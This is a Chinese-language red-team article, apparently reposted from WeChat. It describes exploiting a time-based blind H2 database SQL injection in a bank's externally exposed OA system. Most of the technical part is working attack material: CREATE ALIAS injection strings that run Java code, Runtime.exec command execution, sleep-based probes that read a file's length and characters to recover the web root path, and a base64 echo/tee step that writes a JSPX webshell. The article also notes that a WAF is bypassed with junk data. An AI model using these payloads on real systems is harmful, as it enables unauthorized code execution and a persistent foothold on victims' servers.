<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Lu4V_J6cresqmVnfQmg05g)

WebWW![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450ATcz6jUJnFNeOxRzVZ9Lbc0INLwTJTZT1GaNutZrfDn6csvjBoS2ox0efLUEexXqPEcVbYfbLo8w/640?wx_fmt=png)

 **Part1 前言** 
--------------

这个案例是在做一次银行项目的红队评估工作中遇到的，该银行把 OA 办公系统放在外网，当时有同事审计出了该系统的 H2 Database 注入漏洞，一旦存在 H2 数据库注入漏洞，多数情况下都可以通过自定义函数的方式直接执行任意 java 代码。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450A7gTjibyCfnDHIlsybrVMesxj6CIXxa7Qic8IYeCYqItw691icwyvGVKtUPEzBct8jWVcCZLC7lxCMw/640?wx_fmt=png)

当时遇到的 H2 数据库的注入漏洞是个延时注入点，利用起来有以下几个难点：

 **1**  无法直接写入内存马，因为当时并没有 H2 数据库的内存马注入方法，**后来由公司的观星实验室的** **Magic_Zero** **研究出了 H2 数据库写内存马的方法**_。_

 **2**  判断注入漏洞利用成功与否，只能通过延迟方法来判断，因为该 H2 数据库注入点没有回显，返回页面没啥变化。

 **3**  该注入漏洞的 TCP、UDP、DNS 都不通，再次确认，注入点只能以延时方式来利用。

 **4**  有 waf 防护，这个不是本文的重点，就不展开讲了，只要加一些脏数据就可以绕过 waf。

为了充分利用此延时注入点写一个 webshell，开始了一段波折的研究之路。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450A7gTjibyCfnDHIlsybrVMesfARezuKzVqOBHMicbOUAFx7I2b1QUe0OyyBIrThKibw15clqOibibwgAqA/640?wx_fmt=png)

 **Part2 技术研究过程** 
------------------

*   ### **H2 数据库注入漏洞示例**
    

ABC_123 在这里先举一个例子，让新手朋友了解一下 H2 注入漏洞的形式。如下图所示，和普通的 sql 注入漏洞一样，在 **uploadID=031** 后加上单引号，然后用; 进行多语句拼接。需要注意的是，查询语句中的**”CREATE ALIAS”** 后面的 **VVbzPR043316** 部分我做了随机化处理，因为每次 sql 语句执行之后，这里的函数名都得再换个名字。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450A7gTjibyCfnDHIlsybrVMespuHwuJCoDicCEC7BlKQONg95PmtcYyEhDC5iadh5CSgDslibJV8fv3N0g/640?wx_fmt=png)

接下来为了演示方便，我只贴出具体的漏洞利用的 java 代码，大家实战使用的时候，直接在 java 代码前后拼接上 H2 数据库查询语句即可。

*   ### **一键写 webshell 方法**
    

由于不知道绝对路径，写 shell 成了一个麻烦事，因为通过注入写 shell，必须提前知道网站的绝对路径，然而依靠延时漏洞去一个字符一个字符地猜解绝对路径是非常非常耗费时间和精力的。Magic_Zero 给我发了一个代码，我在虚拟机下测试成功，但是在这个生产环境中执行失败，具体命令如下所示：

**uploadID=1';CREATE+ALIAS+fun669+AS+$$+void+f(String+cmd)+throws java.io.IOException+{(new+java.io.FileOutputStream(System.getProperty("user.dir")%2B"/webapps/ROOT/images/hello.txt")).write("helloworld".getBytes())%3B}$$;CALL+fun669('1');or'**

*   ### **为获取 web 路径做准备**
    

接下来只能通过延时判断方法一个字符一个字符地把 web 绝对路径猜解出来了。在这里我们首先判断一下操作系统，具体 java 代码如下，如果网站返回出现延迟，说明操作系统是 Linux 的。

**{if(!System.getProperty("os.name").contains("win")){java.lang.Thread.sleep(10000);}**

*   ### **Linux 执行命令语句改造**
    

接下来还需要构造好执行系统命令的 java 代码，一开始用如下代码去执行命令，发现很多命令执行不成功，百思不得其解：

**{java.lang.Runtime.getRuntime().exec(cmd)%3B+}**

后来发现，需要改造一下 java 代码，变成如下形式即可：

**{java.lang.Runtime.getRuntime().exec(new String[]{"bash", "-c", "cmd"}**

*   ### **延时盲注猜解绝对路径**
    

通过翻看源代码，发现该 CMS 存在一个图片 login_btn_bg.png，于是通过执行 find 查找命令，将包含 login_btn_bg.png 的路径输出到 / tmp/testpath.txt 中。

**java.lang.Runtime.getRuntime().exec(new String[]{"bash", "-c", "find / -name login_btn_bg.png > /tmp/login_btn.txt"});**

上述 java 代码也保证了最终在 testpath.txt 中只有一行数据，如果是多行的话，那获取网站绝对路径需要猜解太多字符，工作量太大了。

接下来要想办法读 / tmp/testpath.txt 文件中网站的绝对路径，首先判断一下 **/tmp/testpath.txt** 中文本的长度，用折半法把绝对路径猜出来。以下两个语句说明，/tmp/testpath.txt 文本中记录的绝对路径的长度，大约在 50 左右：

**if(new java.io.File("/tmp/login_btn.txt").length() > 49) {java.lang.Thread.sleep(10000);}** **延迟**

**if(new java.io.File("/tmp/login_btn.txt").length() > 51) {java.lang.Thread.sleep(10000);}** **不延迟**

*   **动脑筋想办法加速延时注入**
    

接下来要用延时注入的方法，把大约 50 长度的网站绝对路径一个字符一个字符地猜出来，这个时间非常慢，经过思考，可以通过以下方法大大减少延迟注入猜解的次数：

首先如下图所示，对于 linux 系统，网站存放的根目录，无非就是 **/root** 、**/home**、  **/usr**  、**/opt** 等目录：

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450A7gTjibyCfnDHIlsybrVMesrMWTibqic2YBC311f6qT3v7Tk11xib79aUQFF7gRpeUibATicicj7o5yLycg/640?wx_fmt=png)

接下来，通过延时注入判断网站绝对路径的第 2 个字符到底是 h 还是 o 还是 r 还是 u 等等（第 1 个字符就不用判断了，肯定是”/”）。

最终构造出 Java 语句如下：（**记得当时我换了好几种 java 代码写法，这个是在当时环境中能用的**）

**java.io.File file = new java.io.File("/tmp/login_btn.txt");java.io.FileInputStream fis;fis = new java.io.FileInputStream(file);java.io.InputStreamReader isr = new java.io.InputStreamReader(fis);java.io.BufferedReader br = new java.io.BufferedReader(isr);char ch = br.readLine().charAt(1);if(ch=='u'){java.lang.Thread.sleep(10000);}**

经过测试发现，当 **ch==’u’**的时候，网站返回会延迟 10 秒，所以很容易猜解到绝对路径的开头的几个字母是 / usr/

接下来判断 / usr / 后面的第一个字符，这个就得一个字符一个字符地猜解了，最后手气不错，猜到是 e，于是得到绝对路径是 / usr/e

动动脑筋，很容易推测绝对路径有可能是 / usr/emobile/，那么如何证明是不是呢？只要判断第 11 个字符是不是 e 就可以了，经过判断是 e。如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450A7gTjibyCfnDHIlsybrVMesxHSQEB0mGpae1NnnL3ibCoDePiaWMw0Fgyuv4CaNq5tib4JBoCuPRLsFQ/640?wx_fmt=png)

接下来我跟同事要了一份该 CMS 系统的 war 包，参考着把剩余的路径拼接上：

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450A7gTjibyCfnDHIlsybrVMesbfqxqEKjMqD6cOhap4OEUdeW5MmSRhSicrfZVLOmvdLThT6o00sPdFQ/640?wx_fmt=png)

得到最终的绝对路径：

**/usr/emobile/webapps/ROOT/images/login_btn_bg.png**

*   **写 webshell 过程**
    

接下来就是写 shell 过程了。该 CMS 系统的过滤器使传在 / webapps/ROOT/images / 目录下的 shell 均无法在未登录状态下访问，结合源码经过一系列测试，发现可以将 webshell 传在 **/images/manager/** 目录下。

然后再通过 echo 命令写 shell 即可，由于 jsp 的 webshell 的各种特殊字符的干扰，直接用 echo 命令写 shell 需要将这些特殊字符转义，于是先把 webshell 进行 base64 编码，然后再通过 linux 命令解码写 shell，具体代码如下：

**echo PGpzcDpyb290IHc2lvbj0iMS4yIj48a == | base64 -d | tee /usr/*** 省略 **/temp1231.jspx**

如下所示，成功获取一个 webshell。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450A7gTjibyCfnDHIlsybrVMes9ibtwiaGNmLOmdz968vpnmicc2FXlQp7esciaQTYNwrOHHuBKGnDpouWGA/640?wx_fmt=png)

 **Part3 总结** 
--------------

**1.**  0day 是别人挖的，但是如何在后期利用中去发挥 0day 价值，还得是靠自己。

**2.**  通过这个案例可以知道，常规的 SQL 注入漏洞的后期利用、java 代码的基础等等，这都是基本功，还是要用心学习的。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450A5qqg2iaK6KIYYR8y6pF5Rh3JHDibOKOop204nXz618iawdRb8dABicMPtHb2PkJE8x6koJO5HyuwZJQ/640?wx_fmt=png)

**公众号专注于网络安全技术分享，包括 APT 事件分析、红队攻防、蓝队分析、渗透测试、代码审计等，每周一篇，99% 原创，敬请关注。**

**Contact me: 0day123abc#gmail.com(replace # with @)**